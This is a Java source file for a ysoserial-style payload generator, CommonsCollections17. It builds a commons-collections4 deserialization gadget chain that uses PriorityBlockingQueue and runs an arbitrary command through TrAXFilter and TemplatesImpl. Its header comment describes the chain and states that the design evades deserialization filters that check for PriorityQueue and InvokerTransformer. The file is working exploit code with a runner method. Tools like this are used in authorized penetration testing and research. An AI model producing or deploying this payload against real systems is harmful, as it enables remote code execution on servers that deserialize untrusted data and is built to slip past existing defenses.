package ysoserial.payloads;

import java.io.Serializable;
import java.util.concurrent.PriorityBlockingQueue;

import javax.xml.transform.Templates;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	PriorityBlockingQueue entry point with InstantiateTransformer sink.
	Concurrent variant of PriorityQueue — bypasses PQ-specific filters.

	Gadget chain:
		ObjectInputStream.readObject()
			PriorityBlockingQueue.readObject()
				PriorityBlockingQueue.heapify()
					PriorityBlockingQueue.siftDownUsingComparator()
						TransformingComparator.compare()
							ChainedTransformer.transform()
								ConstantTransformer -> TrAXFilter.class
								InstantiateTransformer -> new TrAXFilter(TemplatesImpl)
									TemplatesImpl.newTransformer()
										... -> RCE

	Filter evasion:
		1. PriorityBlockingQueue (java.util.concurrent) — not in any filter
		   Filters check PriorityQueue specifically, not PriorityBlockingQueue
		2. No InvokerTransformer (InstantiateTransformer sink)
		3. No LazyMap/TiedMapEntry/DefaultedMap

	Same heapify() mechanism as PriorityQueue, but different class identity.
	PBQ.readObject() reads elements then calls heapify() which calls
	comparator.compare() to restore heap ordering.

	Requires:
		commons-collections4 4.0+
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections17 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(command);

		// mock values until armed
		ConstantTransformer constant = new ConstantTransformer(String.class);
		Class[] paramTypes = new Class[] { String.class };
		Object[] args = new Object[] { "foo" };
		InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, args);

		// grab defensively copied arrays
		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
		args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

		ChainedTransformer chain = new ChainedTransformer(
			new Transformer[] { constant, instantiate });

		// PriorityBlockingQueue — concurrent variant, different class identity
		PriorityBlockingQueue<Object> queue = new PriorityBlockingQueue<Object>(
			2, new TransformingComparator(chain));
		queue.add(1);
		queue.add(1);

		// arm
		Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
		paramTypes[0] = Templates.class;
		args[0] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections17.class, args);
	}
}
